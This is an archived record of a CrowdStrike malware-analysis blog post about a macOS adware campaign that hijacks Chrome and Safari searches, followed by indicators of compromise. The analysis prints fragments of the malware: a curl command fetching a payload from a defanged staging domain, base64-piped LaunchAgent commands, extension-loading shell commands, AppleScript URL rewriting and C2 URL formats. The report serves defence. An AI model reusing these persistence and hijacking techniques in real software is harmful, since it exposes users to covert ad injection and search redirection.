{
    "id": "72365c43-eb43-4488-ad3d-9cf1761531a7",
    "created_at": "2023-01-12T15:05:33.294861Z",
    "updated_at": "2025-03-27T02:06:05.615793Z",
    "deleted_at": null,
    "sha1_hash": "df416f1e917b9fbb5d9726632c0e37894ca45c8d",
    "title": "2022-06-02 - CrowdStrike Uncovers New MacOS Browser Hijacking Campaign",
    "authors": "",
    "file_creation_date": "2022-08-18T03:21:00Z",
    "file_modification_date": "2022-08-18T03:21:00Z",
    "file_size": 1726129,
    "plain_text": "# How CrowdStrike Uncovered a New MacOS Browser Hijacking Campaign\n\n**[crowdstrike.com/blog/how-crowdstrike-uncovered-a-new-macos-browser-hijacking-campaign/](https://www.crowdstrike.com/blog/how-crowdstrike-uncovered-a-new-macos-browser-hijacking-campaign/)**\n\nEPP Content Research Team June 2, 2022\n\nCrowdStrike analyzed a new browser hijacking campaign that targets MacOS\nThe purpose of the campaign is to inject ads into the user’s Chrome or Safari browser\nThe [CrowdStrike Falcon®](https://www.crowdstrike.com/endpoint-security-products/falcon-platform/) platform provides continuous protection against browser hijacking threats by offering real-time\nvisibility across workloads\n\nThe CrowdStrike Content Research team recently analyzed a MacOS targeted browser hijacking campaign that modifies the\nuser’s browsing experience to deliver ads. Research began with a variant that uses a combination of known techniques to\ndeliver, persist and sideload a Chrome extension. Analysis of the fake Chrome installer uncovered the use of more than 40\nunique dropper files to install the extension. During analysis of the original samples, an additional variant was discovered that\ntargets Safari browser usage and employs a combination of AppleScript and Python to accomplish similar browser hijacking\nactivity. At the time of writing, more than 15 unique dropper files have been found for this particular variant.\n\n## Technical Analysis\n\n### Fake Chrome Installer\n\nThe Chrome variant sideloads a malicious Chrome extension with the purpose of hijacking browser activity and delivering\ncustom ad content.\n\n**Installation**\n\nThe initial infection vector uses an Apple Disk Image (DMG) that masquerades as legitimate software and video files. Once\nthe DMG file is mounted on the machine and the user is tricked into clicking the application icon, an install script is executed to\ninitialize the setup process, as shown in Figure 1.\n\n\n-----\n\nFigure 1. Example of DMG installation instructions\n\nWhile the DMG file names are masquerading as software and video files, they all share a similarity and result in a mounted\nvolume with the name `Application Installer . The mounted volume prompts the user to execute an apparent Chrome`\ninstallation application, but this is actually a malicious script file contained in the DMG. Early variants of this family used script\nfiles named `installer.command . Later variants use` `ChromeInstaller.command` script files.\n\nUpon initialization, the install script hides visible Terminal windows from the user’s view by leveraging `osascript` to conceal\nthe installation actions. Then it makes a query for an existing infection by checking the results of `launchctl list | grep`\n```\n\"chrome.extension\" and exits if the command returns any matching launchd jobs.\n\n```\nPrior to downloading the extension, an attempt is made to validate the returned status code from the web server using curl:\n```\nstatus_code=$(curl --write-out %{http_code} --head --silent --output /dev/null https[:]//ckgrounda[.]com/archive.zip\n)\n\n```\nIf the return code is 200, curl is again used to download and write the archive file with the zipped payload written to\n```\n/private/var/temp/[uuid].zip . The native unzip utility is used to expand the archive into a new folder also named\n\n```\nwith a random UUID in `/private/var/temp/ . Any other return code results in the script exiting.`\n\n**Persistence**\n\nThe Chrome extension is installed and maintained by a number of plist files written to the user directory\n```\n~/Library/LaunchAgent/ . To conceal the malicious behavior, the underlying commands in the plist files are obfuscated\n\n```\nwith Base64 encoding.\n```\n<key>ProgramArguments</key>\n\n<array>\n\n<string>sh</string>\n\n<string>-c</string>\n\n<string>echo aWYgcHMg -[ SNIP ]- Zmk= | base64 --decode | bash</string>\n\n</array>\n\n\n```\nBelow is a list of each file created, the Base64 decoded file contents and the description.\n\n\n-----\n\nStartInterval Values (seconds) Decoded Plist Payloads Description\n\n\n31 `if ps ax | grep -v grep | grep 'Google Chrome' &>`\n```\n                    /dev/null; then echo running;\n                    EXTENSION_SERVICE='Google Chrome --load-extension'; if\n                    ps ax | grep -v grep | grep 'Google Chrome --load                    extension' &> /dev/null; then echo e running; else \n                    pkill -a -i 'Google Chrome'; sleep 1 ; open -a 'Google\n                    Chrome' --args --load                    extension='/private/var/temp/[rand uuid]' --restore                    last-session --noerrdialogs --disable-session-crashed                    bubble; fi; else echo not running; fi\ncom.chrome.extensions.plist\n\n```\n21600 `pkill -a -i 'Google Chrome'; sleep 1 ; open -a`\n```\n                    'Google Chrome' --args --load                    extension='/private/var/temp/[rand uuid]' --restore                    last-session --noerrdialogs --disable-session-crashed                    bubble;\ncom.chrome.extensionsPop.plist\n\n```\n3600 `open -na 'Google Chrome' --args -load-`\n```\n                    extension='/private/var/temp/[rand uuid]' --new-window\n                    \"$https[:]//ationwindon[.]com/?tid=949115\"\n\n```\n\nResolve/hide\ncrashes\n\nForce the\nextension\nload\n\nEnsure ad is\nalways open\n\n\nAs shown above, the naming convention of the plist files attempts to evade general suspicion by masquerading as\ncomponents of the Chrome browser.\n\nAll of the Launch Agents utilize a `StartInterval parameter. This means that each is executed periodically on its defined`\ninterval.\n\nNote that the `com.chrome.extensionsPop.plist appears to have a typo in the “ -load-extension ” parameter; however,`\nthe command works as expected and is successful in sideloading the extension. A notable commonality across the variants\nanalyzed is the check-in domain `ationwindon[.]com .`\n\n**Extension Initialization**\n\nThe extension is sideloaded from disk via any of the plists using the `--load-extension parameter. The extension utilizes a`\nnumber of alarms and blocking listeners to facilitate its browser hijacking and ad content delivery.\n\nThe extension contains a hard-coded command-and-control (C2) domain referred to in this blog as `C2Domain, and a unique`\nidentifying string defined as `ExtensionId . These static values are used to reference the C2 domain and extension ID in the`\nblog; however, each extension analyzed contained its own unique values.\n\nThe extension contains a system to provide time-dependent storage for ad content and dynamic parameters sent from the C2.\nThis is accomplished by storing and retrieving JSON objects from Chrome’s `localStorage . Key/Value pairs are stored with`\n```\nexpiry value. Retrieved objects with an expiry value less than the current time are returned as null and removed from\nlocalStorage .\n\n```\nUpon execution, the extension establishes two Chrome alarms: a heartbeat and an update frequency for ad content. The\nheartbeat alarm fires every three hours while the ad alarm triggers every 30 minutes. After configuring these parameters, the\nextension beacons to the C2 with a message signifying a successful install. It is sent using the following format:\n```\nhttps://[C2Domain]/install?ext=[ExtensionName]&ver=[ExtensionVersion]&dd=[ExtensionId]\n\n```\nFollowing the beacon and an initial heartbeat, the extension enumerates all installed extensions running in Chrome using a\n```\nchrome.management.getAll() call. The ExtensionInfo[] response is sent as JSON in a POST message back to the C2\n\n```\ndomain.\n\nThe POST response contains a list of extensions IDs in a JSON list. These IDs are then used to disable extensions using\n```\nchrome.management.setEnabled() API calls. This is done to remove extensions that conflict with the hijacking\n\n```\nfunctionality.\n\n\n-----\n\nAs a final install step, the extension modifies a policy in Chrome to disable search suggestions by disabling the\n```\nsearchSuggestEnabled field. This also disables keyword search and autocompletion capabilities.\n\n```\nThe first listener monitors web requests destined for the hardcoded C2 domain. Any requests to the domain are appended\nwith the `ExtensionId as a` `requestHeader . This additional request header serves to identify victims. Responses from this`\ndomain are also monitored for a randomness variable ( rand ) in the `requestHeader . This randomness variable is stored in`\n```\nlocalStorage with an expiration time of 300 seconds. The randomness variable is used to provide inconsistency to the\n\n```\nsearch hijacking functionality.\n\n**Hijack via a Blocking Listener**\n\nNext, the extension establishes a blocking listener to facilitate the search hijacking. This listener runs on outbound requests to\nURLs containing “ google. ”, “ search.yahoo ” or “ bing. ”. If the requests contain search parameters, a random float value\nis generated between 0 and 100. If the random float is less than the `rand variable, then the search request is redirected to`\nthe following URL:\n```\nhttps://[C2Domain]/search?ext=[ExtensionName]&ver=[ExtensionVersion]&is=[OriginalSearchRedirectBoolean]&q=\n[OriginalSearchQuery]\n\n```\nIt can be theorized that the `rand variable exists to evade users’ suspicion that their machines are infected. With it set, only a`\nportion of a user’s web searches will be redirected.\n\n**Defense Evasion**\n\nThe extension configures three techniques to evade discovery and deletion. The extension adds a listener for\n```\nchrome://extensions, and any requests to that page will be redirected to chrome://settings . The extension configures\nonClicked actions so that a left or right-click on the extension’s context menu will also open a tab to chrome://settings .\n\n```\nFinally, if the user is able to bypass these barriers, the extension configures an `UninstallURL so a tab to the following URL`\nwill be opened if the extension is successfully removed:\n```\nhttps://[C2Domain]/uninstall?ext=[ExtensionName]&ver=[ExtensionVersion]&dd=[ExtensionId]\n\n```\n**Core Functionality**\n\nThe core functionality of the extension comes from its two alarms. These alarms run periodically to maintain the C2 heartbeat\nand update the delivered ad content.\n\n**Heartbeat Alarm**\n\nEvery three hours, the heartbeat alarm makes a series of callouts to the C2. First, it makes a GET request to:\n```\nhttps://[C2Domain]/hb?ext=[ExtensionName]&ver=[ExtensionVersion]&dd=[ExtensionId]\n\n```\nThis is followed by a GET request to `https://[C2Domain]/redsync, and the response of this request is sent in a call to:`\n```\nhttps://[C2Domain]/sync?ext=[ExtensionName]&ver=[ExtensionVersion]&dd=[ExtensionId]&info=[Response]\n\n```\nThe heartbeat and response do not influence the client-side code. The extension does not handle any fail requests or returned\ndata. It just serves as a check-in to the C2 and is simply a notification of a live infection.\n\n**Ad Alarm**\n\nThe ad alarm runs every 30 minutes. Its objective is to ensure that the ad content is updated and running. To do this, it\nretrieves the object from the expiry storage. If it is expired, new ad content is loaded from:\n```\nhttps://[C2Domain]/ad?ext=[ExtensionName]&ver=[ExtensionVersion]&dd=[ExtensionId]\n\n```\nThis content is opened in a new tab, and the new tab’s `tabId is stored in expiry storage with a 24-hour expiration date. If the`\nalarm runs and the ad content is not expired, then it checks to see if the `tabId is still open. If it isn’t, it proceeds as if the ad`\ncontent is expired.\n\n### Fake Safari Installer\n\n\n-----\n\nResearch into this family led to the discovery of a variant targeting the Safari browser. This variant shares many similarities to\nthe Chrome variant; however, it is technically less advanced.\n\n**Installation**\n\nThe Safari installer variant shares a similar delivery mechanism via DMGs with random names and the `Application`\n```\nInstaller volume name; however, all Safari DMGs have been observed to use script files with the naming convention\nSafariInstaller.command .\n\n```\nMuch like the Chrome variant, the `SafariInstaller.command files download their payload from statically defined staging`\nservers. The response contains two Base64 data blobs that decode into Python code. These blobs are inserted directly into\ntwo plist files. Unlike the Chrome variant, the plist files pipe the Base64 decoded data to Python and then bash.\n```\n<key>ProgramArguments</key>\n\n<array>\n\n<string>sh</string>\n\n<string>-c</string>\n\n<string>echo aW1w -[ SNIP ]- kKQ== | base64 --decode | python | bash</string>\n\n</array>\n\n```\n**Persistence and Core Functionality**\n\nThe first plist, `~/Library/LaunchAgents/com.safarii.extension.plist, does not use a` `StartInterval value like the`\nChrome variant, but instead uses `RunAtLoad . The` `RunAtLoad parameter is executed when the user logs into their`\ncomputer. Note that the plist file does not use the correct spelling of Safari.\n\nAt the time of writing, the Python payload runs in an infinite loop and serves two functions:\n\n1. Sends a periodic heartbeat (approximately every hour)\n2. Monitors search engine queries in Safari\n\nThe script ensures that only one copy is running via a call to `ps aux . If any process commandline contain` `base64 –decode`\n```\n| python, then the newly executing script exits.\n\n```\nThe hourly heartbeat calls out to:\n```\nhttps://[C2Domain]/hb?ext=saf&ver=[ScriptVersion]&is=0&dd=[ScriptId]&q=[LastSearchQuery]\n\n```\nSimilar to the Chrome extension, the Python script monitors searches to Google, Yahoo and Bing through the use of\nAppleScript. Every loop interval (~0.1 seconds), the following `osascript process is used to capture the currently opened`\nSafari URL:\n```\nosascript -e 'tell application \"safari\"\n\nset curURL to URL in front document\n\nreturn curURL\n\nend tell’\n\n```\nIf a new search query is found, the Safari window’s URL is overwritten with:\n```\nhttps://[C2Domain]/search?ext=saf&ver=[ScriptVersion]&is=0&dd=[ScriptId]&q=[OriginalSearchQuery]\n\n```\nThis is accomplished by the following osascript process:\n```\nosascript -e 'tell application \"safari\"\n\nset URL in front document to \"[URL]\"\n\nend tell’\n\n```\nIf the script detects that it does not have the necessary transparency, consent and control (TCC) permissions to launch\n```\nosascript or call out to the C2, it will launch a tccutil subprocess to reset all permissions for Apple Events. By resetting\n\n```\nthis value, the user will be re-prompted with a security warning. The author is hoping that because of the new prompt, the user\nwill allow the Apple Events communication.\n\n\n-----\n\nThe `SafariInstaller.command script writes its second plist file to`\n```\n~Library/LaunchAgents/com.extension.pop.plist . This plist serves the same purpose as\ncom.chrome.extensionsPop.plist . It uses Python and an os.system call to open a new Safari window to the same\nhttps[:]//ationwindon[.]com domain observed in the Chrome installer variants.\n\n## Impact\n\n```\nBoth variants result in an altered user experience. Accomplished through the Chrome extension or AppleScript, both variants\nare highly persistent and perform browser hijacking. They are successful in continually displaying ad content and redirecting\nweb searches to attacker-controlled redirect pages.\n\n## The Falcon Platform’s Continuous Monitoring and Visibility\n\nThe Falcon platform takes a layered approach to protect workloads. Using on-sensor and cloud-based machine learning,\n[behavior-based detection using indicators of attack (IOAs), and intelligence related to tactics, techniques and procedures](https://www.crowdstrike.com/cybersecurity-101/indicators-of-compromise/ioa-vs-ioc/)\n(TTPs) employed by threats and threat actors, the Falcon platform enables visibility, threat detection and continuous\nmonitoring for any environment, reducing the time to detect and mitigate threats.\n\nFigure 2. Suspicious plist creation (Click to enlarge)\n\nThe Falcon platform’s behavior-based IOAs detect and prevent behaviors that indicate malicious intent. For example, Falcon\ndetects and prevents behavior such as the installation of suspicious ASEP plist files (see Figure 2) and execution of\nsideloaded, suspicious Chrome extensions (see Figure 3).\n\n\n-----\n\nFigure 3. Previously infected host IOA detection (Click to enlarge)\n\n## Indicators of Compromise (IOCs)\n\nThe hashes below are a small subset of the total DMGs and corresponding installer scripts uncovered in the campaign, to be\nused as reference samples.\n\n**File** **SHA256**\n```\n Your File Is Ready To Download.dmg 46bbb3103bdc2263a0b50eb80815705f61885b3e3e132e5e5c5ff822512085ca\n SafariInstaller.command e31607b87355b4ae3e5f96c6b48ed783e6b706fb1c2ab6a1ff25a13af615bca7\n nature_beautiful_short_video_720p_hd 81ac23cc9dba6bed6e33d172e011ead46254a29483c287f35c670d81bc9785b7\n (2).dmg\n ChromeInstaller.command e734ec9832f8385eb737dd024eb96d53d0d3cb534a72afb4730db8e7e6162fcc\n BigBrother_AnotherStory-0.07.p2.00- 53ddfdb4c01ace20322647eead73ddf77e6d9613b73ca90521c2e57063be387b\n mac.zip.dmg\n installer.command 83d6ab417c9a362e6292dd8d85032b623889d9154b9d357fd8576f843fbecae9\n\n```\n**Domains**\n```\n ationwindon[.]com\n\n```\n**Additional Resources**\n\n_[Learn more about Falcon Endpoint Security for macOS.](https://www.crowdstrike.com/falcon-endpoint-security-for-macos/)_\n_[Check out a video demo for Falcon Endpoint Security for macOS.](https://crowdstrike.wistia.com/medias/eitp4iya00)_\n_[Test CrowdStrike next-gen AV for yourself with a free trial of Falcon Prevent™.](https://go.crowdstrike.com/try-falcon-prevent.html)_\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-06-02 - CrowdStrike Uncovers New MacOS Browser Hijacking Campaign.pdf"
    ],
    "report_names": [
        "2022-06-02 - CrowdStrike Uncovers New MacOS Browser Hijacking Campaign.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535933,
    "ts_updated_at": 1743041165,
    "ts_creation_date": 1660792860,
    "ts_modification_date": 1660792860,
    "files": {
        "pdf": "https://archive.orkl.eu/df416f1e917b9fbb5d9726632c0e37894ca45c8d.pdf",
        "text": "https://archive.orkl.eu/df416f1e917b9fbb5d9726632c0e37894ca45c8d.txt",
        "img": "https://archive.orkl.eu/df416f1e917b9fbb5d9726632c0e37894ca45c8d.jpg"
    }
}